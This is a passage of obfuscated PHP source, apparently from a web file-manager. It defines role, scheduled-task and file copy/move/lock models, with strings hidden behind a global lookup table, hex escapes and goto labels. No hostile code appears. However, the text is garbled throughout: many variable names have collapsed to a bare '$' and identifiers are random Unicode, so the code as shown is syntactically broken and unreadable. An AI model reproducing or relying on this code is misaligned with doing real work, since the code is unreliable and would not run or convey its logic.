$->lockMoveEnd($Ϗ); } $->updateModifyTime($ڶѮ); } private function restoreFolderChildren($, $Ғ) { $ުÁ =& $_SERVER[ʯ]; $톍 = Model($ުÁ[1393]); $ = array($ުÁ[190] => array($ުÁ[7], array())); foreach ($Ғ as $) { if ($ == $) { continue; } if (!$톍->isParentOf($, $)) { continue; } $ޅ = $톍->sourceInfo($); if ($ޅ[$ުÁ[461]] == $ުÁ[98]) { $[] = array($ުÁ[628] => array($ުÁ[588], $ޅ[$ުÁ[561]] . $ . $ުÁ[589])); } else { $[$ުÁ[190]][1][] = $; } } if (!$[$ުÁ[190]][1]) { unset($[$ުÁ[190]]); } if (!$) { return; } if (is_array($[$ުÁ[190]]) && is_array($[$ުÁ[190]][1])) { $[$ުÁ[190]][1] = array_unique($[$ުÁ[190]][1]); } $[$ުÁ[1061]] = $ުÁ[1994]; $톍->where($)->setField($ުÁ[481], 1); } private function recycleMove($, $ = 1) { $ =& $_SERVER[ʯ]; $р = Model($[1393]); $ې = Model($[2213]); $立 = array($[190] => $); if ($) { $р->where($立)->setField($[481], 1); $ې->eventRecycle($, $[2214]); } else { $Ԃ = $р->where($立)->find(); $꣢ = $Ԃ[$[461]] == $[98]; $ߓ = $р->fileNameAuto($Ԃ[$[189]], $Ԃ[$[42]], REPEAT_RENAME_FOLDER, $꣢); if ($ߓ != $Ԃ[$[42]]) { $р->rename($, $ߓ); } $р->where($立)->setField($[481], 0); $ې->eventRecycle($, $[2215]); } } } goto Aŭ˟; C퐗ܛ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x72\157\154\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\x74\x68", "\x6c\x61\x62\x65\x6c", "\x64\151\163\x70\x6c\x61\x79", "\163\x79\163\164\145\x6d", "\144\145\x73\x63", "\x69\147\x6e\x6f\x72\x65\x45\x78\164", "\151\147\156\x6f\162\x65\106\151\154\145\123\x69\172\145", "\141\144\x6d\x69\156\151\163\x74\x72\x61\164\157\162", "\163\157\162\x74"); public function listData($ = false, $ = "\163\157\x72\164", $ݘ = false) { $Ǿ =& $_SERVER[ʯ]; $ = parent::listData($, $, $ݘ); if (!$) { foreach ($ as $ĵ => $) { if ($[$Ǿ[2098]] == 1) { $[$ĵ][$Ǿ[502]] = LNG($Ǿ[2337]); } } } return $; } public function update($ˍ, $ϴ) { $Ҁ =& $_SERVER[ʯ]; $ = parent::listData($ˍ); $ = $this->findByName($ϴ[$Ҁ[42]]); if (!$ || $ && $[$Ҁ[451]] != $[$Ҁ[451]]) { return !1; } if ($[$Ҁ[2098]] == 1) { $ϴ = array($Ҁ[42] => $ϴ[$Ҁ[42]], $Ҁ[1919] => $ϴ[$Ҁ[1919]]); } $this->filterAuth($ϴ[$Ҁ[463]]); return parent::update($ˍ, $ϴ); } public function remove($撐) { $ = parent::listData($撐); if (!$ || $[$_SERVER[ʯ][188]]) { return !1; } return parent::remove($撐); } public function add($) { $ =& $_SERVER[ʯ]; $䏱 = $[$[42]]; if ($this->findByName($䏱)) { return !1; } $Ҟ = array($[470] => $䏱, $[1902] => $[12], $[1898] => $[1906], $[2338] => 1, $[1901] => 0, $[2339] => 0, $[1900] => $this->getSort()); $ = array_merge($Ҟ, $); $this->filterAuth($[$[463]]); return parent::insert($); } private function getSort() { $㡓 =& $_SERVER[ʯ]; $Ο = parent::listData(); $ = array_to_keyvalue($Ο, $㡓[12], $㡓[1920]); return empty($) ? 0 : max($) + 1; } private function filterAuth(&$ו) { $ =& $_SERVER[ʯ]; $˲˝ = array(); $ = array_filter(explode($[60], $ו)); foreach ($ as $ו) { $篳 = explode($[10], $ו); if ($篳[0] == $[2340] && $篳[1] != $[1251]) { $ = $篳[0] . $[10] . $篳[1] . $[2341]; if (!in_array($, $)) { $˲˝[] = $; } } $˲˝[] = $ו; } $ו = implode($[60], $˲˝); } public function findRoleDefault() { $΅ =& $_SERVER[ʯ]; $ғ = parent::listData(); $Қ̓ = !1; foreach ($ғ as $) { if (!$ || $[$΅[1918]] == $΅[221] || $[$΅[2098]] == 1) { continue; } if (strstr($[$΅[463]], $΅[2342])) { continue; } if (!strstr($[$΅[463]], $΅[2343])) { continue; } if (!$Қ̓) { $Қ̓ = $; continue; } $ = explode($΅[60], $Қ̓[$΅[463]]); $ = explode($΅[60], $[$΅[463]]); if (count($) > count($)) { $Қ̓ = $; } } return $Қ̓ ? $Қ̓[$΅[451]] : $΅[12]; } public function sort($, $) { return parent::update($, $); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\164\x61\163\x6b\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\164\171\160\x65", "\145\x76\145\156\x74", "\164\x69\155\145", "\144\x65\x73\x63", "\163\171\163\164\145\x6d", "\x65\156\141\142\154\145", "\x6c\141\163\164\122\165\156", "\163\157\162\x74"); public function listData($̭ = false, $߅ݫ = "\163\157\x72\x74", $̦ = false) { return parent::listData($̭, $߅ݫ, $̦); } public function add($䡅) { $ =& $_SERVER[ʯ]; $ = $this->findByName($䡅[$[42]]); if ($) { return !1; } $䡅[$[1661]] = 0; $䡅[$[1920]] = $this->getSort(); return parent::insert($䡅); } private function getSort() { $쌼 =& $_SERVER[ʯ]; $ԉ = parent::listData(); $ = array_to_keyvalue($ԉ, $쌼[12], $쌼[1920]); return empty($) ? 0 : max($) + 1; } public function update($, $䇧) { $Ͼ =& $_SERVER[ʯ]; $ә = $this->listData($); $ρ = $this->findByName($䇧[$Ͼ[42]]); if (!$ә || $ρ && $ρ[$Ͼ[451]] != $ә[$Ͼ[451]]) { return !1; } return parent::update($, $䇧); } public function remove($鴒, $ = false) { $ץ =& $_SERVER[ʯ]; $Ϳڿ = $this->listData($鴒); if (!$Ϳڿ) { return; } if (!$ && $Ϳڿ[$ץ[188]] == $ץ[98]) { return !1; } return parent::remove($鴒); } public function enable($Í, $ҵۖ) { return $this->update($Í, array($_SERVER[ʯ][2332] => $ҵۖ)); } public function run($ܻ) { return $this->update($ܻ, array($_SERVER[ʯ][2344] => time())); } } goto Aɍڅ; FØ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($) { $ =& $_SERVER[ʯ]; if (!$this->allowLock()) { return; } $this->_lockCheck($[594], $); $ = 1; $this->_lockEvent($, array($[595], $[596]), $); $this->_lockParent($, array($[596]), $); $this->_lockEvent($, array($[597], $[598]), $); $this->_lockCheckEnd($[594], $); } public function lockCopyEnd($) { $⬢ =& $_SERVER[ʯ]; if (!$this->allowLock()) { return; } $淑 = 0; $this->_lockEvent($, array($⬢[595], $⬢[596]), $淑); $this->_lockParent($, array($⬢[596]), $淑); $this->_lockEvent($, array($⬢[597], $⬢[598]), $淑); } public function lockWriteStart($, $קҗ = '') { $Ǧ =& $_SERVER[ʯ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ǧ[595], $); $Ԍ = 1; $this->_lockKey($Ǧ[599] . $ . $Ǧ[10] . $קҗ, $Ԍ); $this->_lockEvent($, array($Ǧ[594], $Ǧ[596]), $Ԍ); $this->_lockParent($, array($Ǧ[594], $Ǧ[596]), $Ԍ); $this->_lockCheckEnd($Ǧ[595], $); } public function lockWriteEnd($, $׳ = '') { $ =& $_SERVER[ʯ]; if (!$this->allowLock()) { return; } $͖۷ = 0; $this->_lockKey($[599] . $ . $[10] . $׳, $͖۷); $this->_lockEvent($, array($[594], $[596]), $͖۷); $this->_lockParent($, array($[594], $[596]), $͖۷); } public function lockMoveStart($) { $ =& $_SERVER[ʯ]; if (!$this->allowLock()) { return; } $this->_lockCheck($[596], $); $͈ = 1; $this->_lockKey($[600] . $, $͈); $this->_lockEvent($, array($[594], $[595]), $͈); $this->_lockParent($, array($[594], $[596]), $͈); $this->_lockEvent($, array($[601], $[597], $[598]), $͈); $this->_lockCheckEnd($[596], $); } public function lockMoveEnd($Ǿ) { $ =& $_SERVER[ʯ]; if (!$this->allowLock()) { return; } $٬ = 0; $this->_lockKey($[600] . $Ǿ, $٬); $this->_lockEvent($Ǿ, array($[594], $[595]), $٬); $this->_lockParent($Ǿ, array($[594], $[596]), $٬); $this->_lockEvent($Ǿ, array($[601], $[597], $[598]), $٬); } private function _lockCheck($х᫄, $) { $ =& $_SERVER[ʯ]; $ӊ = $this->sourceInfo($); $ = $х᫄ . $[10] . $; $this->_lockTimeStart[$] = timeFloat(); if (!is_array($ӊ)) { return; } $≉ = LNG($[602]); CacheLock::setErrorMsg($[172] . htmlspecialchars($ӊ[$[42]]) . $[174] . $≉); $this->_lockKey($, 1); $this->_lockKey($, 0); $Ȃ = array_reverse($this->parentLevelArray($ӊ[$[561]])); foreach ($Ȃ as $Ո) { $ = $х᫄ . $[603] . $Ո; if (CacheLock::lockGet($[604] . $)) { $ӊ = $this->sourceInfo($Ո); CacheLock::setErrorMsg($[172] . htmlspecialchars($ӊ[$[42]]) . $[174] . $≉); $this->_lockKey($, 1); $this->_lockKey($, 0); } } } private function _lockCheckEnd($ľ, $Р) { $ =& $_SERVER[ʯ]; $Ȼ = $ľ . $[10] . $Р; CacheLock::setErrorMsg($[430]); if (!isset($this->_lockTimeStart[$Ȼ])) { return; } $ٚ = timeFloat() - $this->_lockTimeStart[$Ȼ]; unset($this->_lockTimeStart[$Ȼ]); if ($ٚ > 0.5) { unset(self::$cacheSourceInfo[$[509] . $Р]); } $Ъ = $this->sourceInfo($Р); if (!$Ъ) { show_json(LNG($[115]), !1); } } private function _lockParent($߰, $ǅ, $Тώ) { if (!$this->autoLockSet) { return; } $ = $this->sourceInfo($߰); if (!is_array($)) { return; } $ы = array_reverse($this->parentLevelArray($[$_SERVER[ʯ][561]])); foreach ($ы as $Ԇ) { $this->_lockEvent($Ԇ, $ǅ, $Тώ); } } private function _lockEvent($̭, $, $) { $ġ =& $_SERVER[ʯ]; if (!$this->autoLockSet) { return; } foreach ($ as $) { $ۮ = $ . $ġ[10] . $̭; if ($ && CacheLock::lockGet($ġ[604] . $ۮ)) { continue; } $this->_lockKey($ۮ, $); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($, $ = 1) { $ = $_SERVER[ʯ][604] . md5($); if ($) { if (isset(self::$_lockItemArr[$])) { return; } self::$_lockItemArr[$] = 1; CacheLock::lock($, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$])) { return; } unset(self::$_lockItemArr[$]); CacheLock::unlock($); } } public function isParentOf($ِ, $ߏɾ) { $Ē =& $_SERVER[ʯ]; $͕̌ = $this->sourceInfo($ِ); $ = $this->sourceInfo($ߏɾ); $󸋑 = $͕̌[$Ē[561]] . $͕̌[$Ē[190]] . $Ē[60]; $֡߭ = $[$Ē[561]] . $[$Ē[190]] . $Ē[60]; $Ȓ = strpos($֡߭, $󸋑) === 0; return $Ȓ; } private $targetIsDelete = 0; public function copy($, $, $ = REPEAT_REPLACE, $כ = '') { $ =& $_SERVER[ʯ]; $ǿ = $this->sourceInfo($); $ = $this->sourceInfo($); if (!$ǿ || !$ || $[$[461]] != $[98]) { return !1; } if ($this->isParentOf($, $)) { return !1; } $ = $כ ? $כ : $ǿ[$[42]]; $this->lockCopyStart($); $this->lockWriteStart($, $); $ң = array($[605] => array(), $[606] => array(), $[607] => array()); $this->targetIsDelete = intval($ǿ[$[481]]); $ = $this->fileNameExistCache($, $ǿ[$[42]]); $˂ = $this->_copy($, $, $, $ң, !0, $כ); $this->_childrenListClear(); $this->lockCopyEnd($); $this->lockWriteEnd($, $); if ($ǿ[$[461]] == $[98] && $ == $˂) { $this->folderSizeResetChildren($); } Model($[608])->addAll($ң[$[606]], array(), !0); if ($ != $˂ || $ǿ[$[461]] == $[98]) { Model($[609])->eventCopy($˂); } $this->saveAll($ң[$[607]]); Model($[223])->linkAdd($ң[$[605]]); $this->folderSizeReset($); $this->updateModifyTime($); return $˂; } private function _copy($, $, $ط, &$, $ܑ, $Ǎ = '') { $Ґ =& $_SERVER[ʯ]; $ = $this->sourceInfoCache($); $炈 = $[$Ґ[461]] == $Ґ[98]; $ۨ = $Ǎ ? $Ǎ : $[$Ґ[42]]; $嬯 = $this->fileNameExistCache($, $ۨ); if ($ܑ) { $this->_childrenAllMake($); if ($炈 && $嬯) { $this->_childrenAllMake($嬯); } } if (!$嬯) { return $this->_copyCreate($, $, $ۨ, $); } $ܒ = $嬯; if ($炈) { if ($ط == REPEAT_RENAME_FOLDER) { $ۨ = $this->fileNameAutoCache($, $ۨ, $ط, $炈); $ܒ = $this->_copyCreate($, $, $ۨ, $); } else { $ = $this->_childrenList($); foreach ($ as $) { $this->_copy($[$Ґ[190]], $嬯, $ط, $, !1); } } } else { if ($ط == REPEAT_RENAME || $ط == REPEAT_RENAME_FOLDER) { $ۨ = $this->fileNameAutoCache($, $ۨ, $ط, $炈); $ܒ = $this->_copyCreate($, $, $ۨ, $); } else { if ($ط == REPEAT_REPLACE) { $ŉ = $this->sourceInfoCache($嬯); $Ҏ = $this->fileHistory($ŉ, $[$Ґ[517]], $[$Ґ[86]]); if ($Ҏ) { $[$Ґ[605]][] = $[$Ґ[517]]; } } else { if ($ط == REPEAT_SKIP) { } } } Hook::trigger($Ґ[610], array($Ґ[611], $, 0)); } return $ܒ; } private function _copyCreate($Ǯ, $, $ұ, &$خ) { $͙ =& $_SERVER[ʯ]; $Ϲ = $this->sourceInfoCache($Ǯ); $ = $this->sourceInfoCache($); $󆛖 = $this->_makeItemData($Ϲ, $, $ұ); Hook::trigger($͙[612], $󆛖); Hook::trigger($͙[613], array($͙[614], $󆛖, 0)); $Å = $this->add($󆛖); $ޔ = array($͙[190] => $Å, $͙[42] => $ұ); $this->_copyApplyMeta($ޔ, $خ); if ($Ϲ[$͙[461]] != $͙[98]) { $خ[$͙[605]][] = $Ϲ[$͙[517]]; return $Å; } $͕ = array(); $֝Č = array(); $this->_childrenListAll($Ǯ, $͕); $ﳂŨ = count($͕); if ($ﳂŨ == 0) { return $Å; } $ߨє = $this->sourceInfo($Å); foreach ($͕ as $ؑ) { $± = $this->_makeItemData($ؑ, $ߨє, $ؑ[$͙[42]]); $±[$͙[561]] = $ؑ[$͙[561]]; $֝Č[] = $±; } $this->chunkEventSet($͙[615], array($͙[616], $󆛖, $ﳂŨ)); $this->addAll($֝Č, array(), !1); $ = $this->where(array($͙[189] => $Å))->select(); $š = $this->_childrenMakeRelation($͕, $); $š[$Ǯ] = $Å; $楻 = array(); $Ͻҷ = array(); foreach ($ as $ؑ) { $ = $ؑ[$͙[190]]; $ = $this->_childrenMatch($š, $ؑ, $ߨє); $楻[] = array($͙[190], $, $͙[189], $[$͙[189]]); $Ͻҷ[] = array($͙[190], $, $͙[561], $[$͙[561]]); $this->_copyApplyMeta($ؑ, $خ); if ($ؑ[$͙[461]] != $͙[98]) { $خ[$͙[605]][] = $ؑ[$͙[517]]; } } $this->chunkEventSet($͙[617], array($͙[618], $󆛖, $ﳂŨ)); $this->saveAll($楻); $this->chunkEventSet($͙[619], array($͙[620], $󆛖, $ﳂŨ)); $this->saveAll($Ͻҷ); return $Å; } private function _childrenMakeRelation($, $ȸ) { $˭ =& $_SERVER[ʯ]; $ҭû = array(); $ = array(); foreach ($ as $) { $ = $[$˭[42]] . $˭[8] . $[$˭[561]]; $ҭû[$] = $[$˭[190]]; } foreach ($ȸ as $) { $ = $[$˭[42]] . $˭[8] . $[$˭[561]]; $ = $ҭû[$]; $[$] = $[$˭[190]]; } return $; } private function _childrenMatch($, $, $Ӻ) { $ =& $_SERVER[ʯ]; $Ɍ = $Ӻ[$[561]]; $ٟؒ = $this->parentLevelArray($[$[561]]); foreach ($ٟؒ as $) { if (isset($[$])) { $Ɍ .= $[$] . $[621]; } } $Ɍ = rtrim($Ɍ, $[60]) . $[60]; $؜ = $this->parentLevelArray($Ɍ); $ = $؜[count($؜) - 1]; return array($[189] => $, $[561] => $Ɍ); } private function _makeItemData($͔, $Ǉ, $) { $خ =& $_SERVER[ʯ]; $ = array($خ[622] => $͔[$خ[461]], $خ[470] => $, $خ[623] => $͔[$خ[462]] ? $͔[$خ[462]] : $خ[12], $خ[518] => $͔[$خ[517]] ? $͔[$خ[517]] : 0, $خ[593] => $͔[$خ[86]] ? $͔[$خ[86]] : 0, $خ[624] => intval($Ǉ[$خ[187]]), $خ[625] => intval($Ǉ[$خ[546]]), $خ[626] => intval(USER_ID), $خ[627] => intval(USER_ID), $خ[453] => intval($Ǉ[$خ[190]]), $خ[628] => $Ǉ[$خ[561]] . $Ǉ[$خ[190]] . $خ[60], $خ[474] => $͔[$خ[95]] ? $͔[$خ[95]] : time(), $خ[480] => 0, $خ[629] => $خ[12]); return $; } private function _copyApplyMeta($, &$) { $Ū =& $_SERVER[ʯ]; $瑞 = $[$Ū[190]]; $܄ߠ = $[$Ū[42]]; if (!isset($[$Ū[630]]) || !$[$Ū[630]] || $[$Ū[630]] == $Ū[221]) { $[$Ū[607]][] = array($Ū[190], $瑞, $Ū[630], short_id($瑞)); } if (Input::check($܄ߠ, $Ū[631])) { $[$Ū[606]][] = array($Ū[190] => $瑞, $Ū[104] => $Ū[514], $Ū[426] => str_replace($Ū[63], $Ū[12], Pinyin::get($܄ߠ))); $[$Ū[606]][] = array($Ū[190] => $瑞, $Ū[104] => $Ū[513], $Ū[426] => Pinyin::get($܄ߠ, $Ū[632])); } $[$Ū[606]][] = array($Ū[190] => $瑞, $Ū[104] => $Ū[493], $Ū[426] => KodSort::makeStr($܄ߠ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ᶎ) { $ =& $_SERVER[ʯ]; $ = $this->sourceInfo($ᶎ); $Н = $[633]; $ = array($[561] => array($[588], $[$[561]] . $ᶎ . $[589]), $[481] => $this->targetIsDelete); $ = $this->field($Н)->where($)->select(); if (!$) { return; } $ = array_to_keyvalue($, $[190]); foreach ($ as $Ղ) { $ĝ = $Ղ[$[189]]; $ᶎ = $Ղ[$[190]]; if (!isset($this->_childrenListCache[$ᶎ]) && $Ղ[$[461]] == $[98]) { $this->_childrenListCache[$ᶎ] = array(); } if (!isset($this->_childrenListCache[$ĝ])) { $this->_childrenListCache[$ĝ] = array(); } $this->_childrenListCache[$ĝ][$ᶎ] = $Ղ; $this->_childrenItemCache[$ᶎ] = $Ղ; } } private function _childrenListAll($, &$) { $ =& $_SERVER[ʯ]; if (!isset($this->_childrenListCache[$])) { return; } $칆 = $this->_childrenListCache[$]; foreach ($칆 as $ԙ => $) { $[$ԙ] = $; if ($[$[461]] == $[98]) { $this->_childrenListAll($ԙ, $); } } } private function sourceInfoCache($) { if (isset($this->_childrenItemCache[$])) { return $this->_childrenItemCache[$]; } return $this->sourceInfo($); } private function _childrenList($Ľ) { if (isset($this->_childrenListCache[$Ľ])) { return $this->_childrenListCache[$Ľ]; } return $this->_childrenListSelect($Ľ); } private function _childrenListSelect($) { $ =& $_SERVER[ʯ]; $ = array($[189] => $, $[481] => $this->targetIsDelete); $ = $this->where($)->select(); $ = $ ? $ : array(); $ʛƥ = array_to_keyvalue($, $[190]); $this->_childrenListCache[$] = $ʛƥ; foreach ($ʛƥ as $ => $㖏) { $this->_childrenItemCache[$] = $㖏; } return $ʛƥ; } private function fileNameExistCache($鑜, $ۢ) { $ʹگ =& $_SERVER[ʯ]; $ۢ = strtolower($ۢ); $ = $this->_childrenList($鑜); foreach ($ as $) { if ($ۢ == strtolower($[$ʹگ[42]])) { return $[$ʹگ[190]]; } } return !1; } private function fileNameAutoCache($, $ô, $ҕ, $Ǆ) { $츱 =& $_SERVER[ʯ]; $ħ = $this->_childrenList($); $՗ = array_to_keyvalue($ħ, $츱[12], $츱[42]); return $this->fileNameAutoGet($՗, $ô, $ҕ, $Ǆ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($, $Ӫᙏ, $ｅ = REPEAT_REPLACE, $ܛα = '') { $Ї딪 =& $_SERVER[ʯ]; $Ҕ = $this->sourceInfo($); $ = $this->sourceInfo($Ӫᙏ); if ($Ҕ[$Ї딪[189]] == $[$Ї딪[190]]) { if ($Ҕ[$Ї딪[481]] == $Ї딪[98]) { Model($Ї딪[479])->restore(array($)); } if (!$ܛα || $ܛα == $Ҕ[$Ї딪[42]]) { return $; } } $ݖ = $this->pathInfoMore($); if ($this->isParentOf($, $Ӫᙏ)) { return !1; } if (!$Ҕ || !$ || $[$Ї딪[461]] != $Ї딪[98]) { return !1; } Hook::trigger($Ї딪[634], $ݖ); $this->targetIsDelete = intval($Ҕ[$Ї딪[481]]); if ($Ҕ[$Ї딪[189]] == $Ӫᙏ && $ܛα != $Ҕ[$Ї딪[42]]) { $Ɍ = $this->fileNameExist($Ӫᙏ, $ܛα); if ($Ɍ && $Ҕ[$Ї딪[461]] == $Ї딪[221]) { $ = $this->sourceInfo($Ɍ); $ = $this->fileHistory($, $Ҕ[$Ї딪[517]], $Ҕ[$Ї딪[86]]); if (!$) { Model($Ї딪[520])->remove($Ҕ[$Ї딪[517]]); } $this->removeNow($, !1); $this->folderSizeReset($Ӫᙏ); Hook::trigger($Ї딪[635], $ݖ); return $Ɍ; } } $ѽگ = $ܛα ? $ܛα : $Ҕ[$Ї딪[42]]; $this->lockMoveStart($); $this->lockWriteStart($Ӫᙏ, $ѽگ); $͗ = array($Ї딪[605] => array(), $Ї딪[636] => !1); $this->clearShare($, $Ӫᙏ); $ = $this->fileNameExistCache($Ӫᙏ, $Ҕ[$Ї딪[42]]); $ = $this->_move($, $Ӫᙏ, $ｅ, $͗, $ܛα); $this->sourceCacheClear(); if ($Ҕ[$Ї딪[461]] == $Ї딪[98] && $) { $this->folderSizeResetChildren($); } Model($Ї딪[223])->linkAdd($͗[$Ї딪[605]]); if ($ && $͗[$Ї딪[636]]) { $this->removeNow($, !1); } $this->lockMoveEnd($); $this->lockWriteEnd($Ӫᙏ, $ѽگ); $this->folderSizeReset($Ҕ[$Ї딪[189]]); $this->folderSizeReset($Ӫᙏ); $ = array($Ҕ[$Ї딪[189]], $Ӫᙏ); if ($Ҕ[$Ї딪[461]] == $Ї딪[98]) { $[] = $; } $this->updateModifyTime($); Model($Ї딪[609])->eventMove($, $Ҕ[$Ї딪[189]], $Ӫᙏ); Hook::trigger($Ї딪[635], $ݖ); return $; } private function _move($돪, $׍, $˧֗, &$ѹ, $ = '') { $桬 =& $_SERVER[ʯ]; $ = $this->sourceInfo($돪); $嶱 = $[$桬[461]] == $桬[98]; $ܟ = $ ? $ : $[$桬[42]]; $ = $this->fileNameExistCache($׍, $ܟ); $this->lockMoveStart($돪); $this->lockWriteStart($׍, $ܟ); if (!$) { return $this->_moveForce($돪, $׍, $ܟ); } $ԩ = $; $ɳ = !1; if ($嶱) { if ($˧֗ == REPEAT_RENAME_FOLDER) { $ܟ = $this->fileNameAuto($׍, $ܟ, $˧֗, $嶱); $ԩ = $this->_moveForce($돪, $׍, $ܟ); } else { if ($˧֗ == REPEAT_RENAME_FOLDER) { $˧֗ = REPEAT_RENAME; } $󙽢 = $this->_childrenListSelect($돪); foreach ($󙽢 as $궍) { $this->_move($궍[$桬[190]], $, $˧֗, $ѹ); } $ɳ = !0; } } else { if ($˧֗ == REPEAT_SKIP) { $ɳ = !0; } else { if ($˧֗ == REPEAT_RENAME || $˧֗ == REPEAT_RENAME_FOLDER) { $ܟ = $this->fileNameAuto($׍, $ܟ, $˧֗, $嶱); $ԩ = $this->_moveForce($돪, $׍, $ܟ); } else { if ($˧֗ == REPEAT_REPLACE) { $ = $this->sourceInfoCache($); $ړϤ = $this->fileHistory($, $[$桬[517]], $[$桬[86]]); $ɳ = !0; if ($ړϤ) { $ѹ[$桬[605]][] = $[$桬[517]]; } } } } } if ($ɳ && !$ѹ[$桬[636]]) { $ѹ[$桬[636]] = !0; } return $ԩ; } private function _moveForce($欘, $稆, $) { $͐ =& $_SERVER[ʯ]; $ؖ = $this->sourceInfo($欘); $ž = $this->sourceInfo($稆); $ = $ؖ[$͐[461]] == $͐[98]; $Ӡ = array($͐[453] => $ž[$͐[190]], $͐[628] => $ž[$͐[561]] . $ž[$͐[190]] . $͐[60], $͐[624] => $ž[$͐[187]], $͐[625] => $ž[$͐[546]], $͐[627] => USER_ID, $͐[470] => $); $漢 = $ؖ[$͐[187]] == SourceModel::TYPE_GROUP && $ž[$͐[187]] == SourceModel::TYPE_GROUP && $ؖ[$͐[546]] == $ž[$͐[546]]; if (!$漢 && $this->moveClearAuth) { Model($͐[543])->authClear($欘); } $մ = $ؖ[$͐[481]] == $͐[98] && $ž[$͐[481]] != $͐[98]; if ($մ) { $Ӡ[$͐[480]] = 0; } if ($) { $ڡ = array($͐[628] => array($͐[588], $ؖ[$͐[561]] . $ؖ[$͐[190]] . $͐[589])); $ײ = $ؖ[$͐[561]] . $ؖ[$͐[190]] . $͐[60]; $ = $ž[$͐[561]] . $ž[$͐[190]] . $͐[60] . $ؖ[$͐[190]] . $͐[60]; $ = array($͐[628] => array($͐[637], "\x72\145\x70\154\x61\x63\x65\x28\x70\141\x72\x65\x6e\164\x4c\145\166\x65\x6c\54\47{$ײ}\x27\54\47{$}\47\51"), $͐[624] => $ž[$͐[187]], $͐[625] => $ž[$͐[546]]); if ($մ) { $[$͐[480]] = 0; } $this->where($ڡ)->data($)->save(); } $this->where(array($͐[467] => $欘))->data($Ӡ)->save(); return $欘; } private function clearShare($ƐϪ, $) { $䤊 =& $_SERVER[ʯ]; $ = $this->sourceInfo($ƐϪ); $ = $this->sourceInfo($); if ($[$䤊[546]] == $[$䤊[546]] && $[$䤊[187]] == $䤊[638]) { return; } $ = array($䤊[561] => array($䤊[588], $[$䤊[561]] . $ƐϪ . $䤊[589])); $т = $this->field($䤊[467])->where($)->getField($䤊[190], !0); if (!$т) { return; } $ = array($䤊[190] => array($䤊[7], $т), $䤊[639] => 1); $΋ = Model($䤊[640])->field($䤊[641])->where($)->select(); if (!$΋) { return; } $΋ = array_to_keyvalue($΋, $䤊[12], $䤊[641]); $ = array($䤊[641] => array($䤊[7], $΋)); Model($䤊[640])->where($)->save(array($䤊[639] => 0)); Model($䤊[642])->where($)->delete(); } public function copyFolderFromIO($ا, $, $, $, $ߥ, $ǌ­ = false) { $ =& $_SERVER[ʯ]; $ = array($[606] => array(), $[607] => array(), $[605] => array(), $[643] => array()); $ = $ǌ­ ? $ǌ­ : $ا->pathThis($); $ = $this->fileNameExist($, $); $ = $this->mkdir($, $, $); if (!$ || $ == REPEAT_RENAME_FOLDER) { $ = !1; } if ($) { $this->_childrenAllMake($); } Hook::trigger($[644]); $this->_copyChildTo($ا, $, $, $, $, $ߥ); Hook::trigger($[645]); if ($) { $this->folderSizeResetChildren($); } $this->_childrenListClear(); Model($[608])->addAll($[$[606]], array(), !0); Model($[609])->eventCopy($); $this->saveAll($[$[607]]); Model($[520])->linkAdd($[$[605]]); Model($[520])->remove($[$[643]]); $this->folderSizeReset($); $this->updateModifyTime($); return $; } private function _copyChildTo($, $, $, $, &$댜ʱ, $埓) { $ =& $_SERVER[ʯ]; $ݠ = $this->sourceInfoCache($); $ۇݜ = $->listPath($); $ۇݜ = $ۇݜ ? $ۇݜ : array($[93] => array(), $[92] => array()); $ = array_merge($ۇݜ[$[93]], $ۇݜ[$[92]]); $١ = $this->_addFiles($, $ۇݜ[$[93]], $埓); $ = array(); foreach ($ as &$ٹ) { if (isset($١[$ٹ[$[42]]])) { $ٹ = $١[$ٹ[$[42]]]; } $ٹ[$[461]] = $ٹ[$[43]] == $[85]; $ٹ[$[462]] = substr(_get($ٹ, $[184], $[12]), 0, 10); $ٹ[$[86]] = _get($ٹ, $[86], 0); $ٹ[$[517]] = _get($ٹ, $[517], 0); if (!isset($ٹ[$[646]]) && $ٹ[$[517]]) { $댜ʱ[$[643]][] = $ٹ[$[517]]; } if ($) { $ = $this->fileNameExistCache($, $ٹ[$[42]]); if ($) { if ($ٹ[$[461]] || $ == REPEAT_SKIP) { continue; } if ($ == REPEAT_REPLACE) { $ = $this->sourceInfoCache($); $ = $this->fileHistory($, $ٹ[$[517]], $ٹ[$[86]]); if ($) { $댜ʱ[$[605]][] = $ٹ[$[517]]; } continue; } else { if ($ == REPEAT_RENAME) { $ٹ[$[42]] = $this->fileNameAutoCache($, $ٹ[$[42]], $, !1); } } } } if (!$ٹ[$[461]] && $ٹ[$[517]] == 0) { continue; } if (!$ٹ[$[461]] && $ٹ[$[517]]) { $댜ʱ[$[605]][] = $ٹ[$[517]]; } $[] = $this->_makeItemData($ٹ, $ݠ, $ٹ[$[42]]); } unset($ٹ); if (!empty($)) { $this->addAll($); $this->_childrenListSelect($); } $ = $this->_childrenList($); $ = array_to_keyvalue($, $[42]); foreach ($ as $ٹ) { $ = $[$ٹ[$[42]]]; $ʦ = $[$[190]]; $this->_copyApplyMeta($, $댜ʱ); if ($ٹ[$[43]] == $[85]) { $ٹ[$[94]] = $->getPathInner($ٹ[$[94]]); $this->_copyChildTo($, $ٹ[$[94]], $ʦ, $, $댜ʱ, $埓); } } } private function _addFiles($돦, $晦, $) { $찀 =& $_SERVER[ʯ]; if (!$晦 || count($晦) == 0) { return array(); } $ç = array(); foreach ($晦 as &$) { Hook::trigger($찀[647], $); $[$찀[94]] = $돦->getPathInner($[$찀[94]]); $ل = $돦->hashSimple($[$찀[94]]); $Ϣ = $돦->hashMd5($[$찀[94]]); if (strlen($Ϣ) > 10 && !isset($ç[$Ϣ])) { $ç[$Ϣ] = array(); } $[$찀[648]] = $ل; $[$찀[649]] = $Ϣ; $ç[$Ϣ][] =& $; if (count($ç[$Ϣ]) > 